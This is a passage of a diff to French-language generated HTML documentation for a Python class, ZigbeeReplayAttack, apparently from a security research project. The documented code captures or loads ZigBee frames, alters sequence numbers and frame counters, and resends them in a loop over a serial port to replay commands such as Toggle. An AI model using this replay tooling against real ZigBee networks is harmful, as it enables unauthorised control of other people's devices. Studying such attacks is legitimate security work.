-<dt><strong><code>nombre_replays</code></strong> :&ensp;<code>int</code>, optional</dt>
-<dd>Nombre de fois que chaque trame sera envoyée. Par défaut 5.</dd>
-</dl></div>
+<div class="desc"><p>Envoie en boucle des trames de replay sur le réseau ZigBee.</p>
+<p>La fonction récupère d'abord une trame initiale (en attente d'une trame Toggle)
+puis, en utilisant la classe ZigbeeFrameFinder, elle incrémente le compteur de trame
+et le numéro de séquence avant de réenvoyer la trame modifiée sur le port série.</p>
+<h2 id="remarque">Remarque</h2>
+<p>La trame initiale est tronquée de ses 4 derniers octets avant d'être traitée.</p></div>
 </dd>
 <dt id="scripts.replay.ZigbeeReplayAttack.lancer_attaque_replay"><code class="name flex">
-<span>def <span class="ident">lancer_attaque_replay</span></span>(<span>self, nombre_replays: int = 5, capture_live: bool = False)</span>
+<span>def <span class="ident">lancer_attaque_replay</span></span>(<span>self, capture_live: bool = True)</span>
 </code></dt>
 <dd>
 <details class="source">
 <summary>
 <span>Expand source code</span>
 </summary>
-<pre><code class="python">def lancer_attaque_replay(self, nombre_replays: int = 5, capture_live: bool = False):
+<pre><code class="python">def lancer_attaque_replay(self, capture_live: bool = True):
     &#34;&#34;&#34;
-    Lance l&#39;attaque de replay complète avec capture et envoi des trames.
+    Lance l&#39;attaque de replay sur le réseau ZigBee.
 
-    Parameters
-    ----------
-    nombre_replays : int, optional
-        Nombre de fois que chaque trame sera envoyée. Par défaut 5.
-    capture_live : bool, optional
-        Si True, effectue une capture live des trames ZigBee. Par défaut False.
+    Selon le paramètre capture_live, la fonction capture en direct les trames ou
+    utilise un fichier de capture existant. Elle démarre ensuite un thread qui
+    exécute l&#39;envoi en boucle des trames de replay.
+
+    Paramètres:
+        capture_live (bool): Si True, la capture en direct est activée; sinon, le fichier de capture est utilisé. Par défaut True.
+
+    Exceptions:
+        Toute exception survenue lors de l&#39;exécution de l&#39;attaque est logguée.
     &#34;&#34;&#34;
     try:
         if capture_live:
-            self.capturer_trames_live()
+            logger.info(&#34;Mode capture live activé&#34;)
         else:
-            self.charger_captures()
-            
-        if not self.captures:
-            logger.error(&#34;Aucune trame à rejouer&#34;)
-            return
-            
-        self.preparer_trames_replay()
-        
-        # Lancement du replay dans un thread séparé
-        thread_replay = threading.Thread(
-            target=self.envoyer_trames_replay, 
-            kwargs={&#39;nombre_replays&#39;: nombre_replays}
-        )
+            with open(self.capture_file, &#39;r&#39;) as f:
+                self.captures = json.load(f)
+
+        thread_replay = threading.Thread(target=self.envoyer_trames_en_boucle)
         thread_replay.start()
         thread_replay.join()
-        
+
     except Exception as e:
-        logger.error(f&#34;Échec de l&#39;attaque de replay : {e}&#34;)</code></pre>
+        logger.error(f&#34;Échec de l&#39;attaque : {e}&#34;)</code></pre>
 </details>
-<div class="desc"><p>Lance l'attaque de replay complète avec capture et envoi des trames.</p>
-<h2 id="parameters">Parameters</h2>
-<dl>
-<dt><strong><code>nombre_replays</code></strong> :&ensp;<code>int</code>, optional</dt>
-<dd>Nombre de fois que chaque trame sera envoyée. Par défaut 5.</dd>
-<dt><strong><code>capture_live</code></strong> :&ensp;<code>bool</code>, optional</dt>
-<dd>Si True, effectue une capture live des trames ZigBee. Par défaut False.</dd>
-</dl></div>
-</dd>
-<dt id="scripts.replay.ZigbeeReplayAttack.preparer_trame_replay"><code class="name flex">
-<span>def <span class="ident">preparer_trame_replay</span></span>(<span>self, trame_originale: dict) ‑> bytes</span>
-</code></dt>
-<dd>
-<details class="source">
-<summary>
-<span>Expand source code</span>
-</summary>
-<pre><code class="python">def preparer_trame_replay(self, trame_originale: dict) -&gt; bytes:
-    &#34;&#34;&#34;
-    Prépare une trame pour le replay en modifiant le numéro de séquence.
-
-    Parameters
-    ----------
-    trame_originale : dict
-        Trame ZigBee originale à modifier.
-
-    Returns
-    -------
-    bytes
-        Trame prête à être envoyée en replay.
-    &#34;&#34;&#34;
-    sequence = random.choice(self.sequence_variations) if self.sequence_variations else random.randint(0, 255)
-    
-    # Modifier la séquence dans la trame
-    if trame_originale[&#39;type_trame&#39;] == &#39;Data&#39;:
-        trame_originale[&#39;couche_mac&#39;][&#39;numero_sequence&#39;] = sequence
-        trame_originale[&#39;couche_reseau&#39;][&#39;sequence_number&#39;] = sequence
-    else:
-        trame_originale[&#39;sequence_number&#39;] = sequence
-        
-    # Encoder la trame modifiée
-    return self.codeur.encoder_trame_zigbee(trame_originale)</code></pre>
-</details>
-<div class="desc"><p>Prépare une trame pour le replay en modifiant le numéro de séquence.</p>
-<h2 id="parameters">Parameters</h2>
-<dl>
-<dt><strong><code>trame_originale</code></strong> :&ensp;<code>dict</code></dt>
-<dd>Trame ZigBee originale à modifier.</dd>
-</dl>
-<h2 id="returns">Returns</h2>
-<dl>
-<dt><code>bytes</code></dt>
-<dd>Trame prête à être envoyée en replay.</dd>
-</dl></div>
-</dd>
-<dt id="scripts.replay.ZigbeeReplayAttack.preparer_trames_replay"><code class="name flex">
-<span>def <span class="ident">preparer_trames_replay</span></span>(<span>self, nombre_trames: int = 20)</span>
-</code></dt>
-<dd>
-<details class="source">
-<summary>
-<span>Expand source code</span>
-</summary>
-<pre><code class="python">def preparer_trames_replay(self, nombre_trames: int = 20):
-    &#34;&#34;&#34;
-    Prépare plusieurs trames pour le replay.
-
-    Parameters
-    ----------
-    nombre_trames : int, optional
-        Nombre de trames à préparer pour le replay. Par défaut 20.
-    &#34;&#34;&#34;
-    self.replay_queue = queue.Queue()
-    
-    for _ in range(nombre_trames):
-        if not self.captures:
-            continue
-
-        trame_originale = random.choice(self.captures)
-        trame_modifiee = self.preparer_trame_replay(trame_originale)
-        self.replay_queue.put(trame_modifiee)</code></pre>
-</details>
-<div class="desc"><p>Prépare plusieurs trames pour le replay.</p>
-<h2 id="parameters">Parameters</h2>
-<dl>
-<dt><strong><code>nombre_trames</code></strong> :&ensp;<code>int</code>, optional</dt>
-<dd>Nombre de trames à préparer pour le replay. Par défaut 20.</dd>
-</dl></div>
+<div class="desc"><p>Lance l'attaque de replay sur le réseau ZigBee.</p>
+<p>Selon le paramètre capture_live, la fonction capture en direct les trames ou
+utilise un fichier de capture existant. Elle démarre ensuite un thread qui
+exécute l'envoi en boucle des trames de replay.</p>
+<h2 id="parametres">Paramètres</h2>
+<p>capture_live (bool): Si True, la capture en direct est activée; sinon, le fichier de capture est utilisé. Par défaut True.</p>
+<h2 id="exceptions">Exceptions</h2>
+<p>Toute exception survenue lors de l'exécution de l'attaque est logguée.</p></div>
 </dd>
 </dl>
 </dd>
@@ -621,7 +470,9 @@ et décode chaque trame pour préparer l'attaque de replay.</p></div>
 </article>
 <nav id="sidebar">
 <div class="toc">
-<ul></ul>
+<ul>
+<li><a href="#module-zigbee_replay_attack">Module : zigbee_replay_attack</a></li>
+</ul>
 </div>
 <ul id="index">
 <li><h3>Super-module</h3>
@@ -634,12 +485,9 @@ et décode chaque trame pour préparer l'attaque de replay.</p></div>
 <li>
 <h4><code><a title="scripts.replay.ZigbeeReplayAttack" href="#scripts.replay.ZigbeeReplayAttack">ZigbeeReplayAttack</a></code></h4>
 <ul class="">
-<li><code><a title="scripts.replay.ZigbeeReplayAttack.capturer_trames_live" href="#scripts.replay.ZigbeeReplayAttack.capturer_trames_live">capturer_trames_live</a></code></li>
-<li><code><a title="scripts.replay.ZigbeeReplayAttack.charger_captures" href="#scripts.replay.ZigbeeReplayAttack.charger_captures">charger_captures</a></code></li>
-<li><code><a title="scripts.replay.ZigbeeReplayAttack.envoyer_trames_replay" href="#scripts.replay.ZigbeeReplayAttack.envoyer_trames_replay">envoyer_trames_replay</a></code></li>
+<li><code><a title="scripts.replay.ZigbeeReplayAttack.attendre_trame_data" href="#scripts.replay.ZigbeeReplayAttack.attendre_trame_data">attendre_trame_data</a></code></li>
+<li><code><a title="scripts.replay.ZigbeeReplayAttack.envoyer_trames_en_boucle" href="#scripts.replay.ZigbeeReplayAttack.envoyer_trames_en_boucle">envoyer_trames_en_boucle</a></code></li>
 <li><code><a title="scripts.replay.ZigbeeReplayAttack.lancer_attaque_replay" href="#scripts.replay.ZigbeeReplayAttack.lancer_attaque_replay">lancer_attaque_replay</a></code></li>
-<li><code><a title="scripts.replay.ZigbeeReplayAttack.preparer_trame_replay" href="#scripts.replay.ZigbeeReplayAttack.preparer_trame_replay">preparer_trame_replay</a></code></li>
-<li><code><a title="scripts.replay.ZigbeeReplayAttack.preparer_trames_replay" href="#scripts.replay.ZigbeeReplayAttack.preparer_trames_replay">preparer_trames_replay</a></code></li>
 </ul>
 </li>
 </ul>
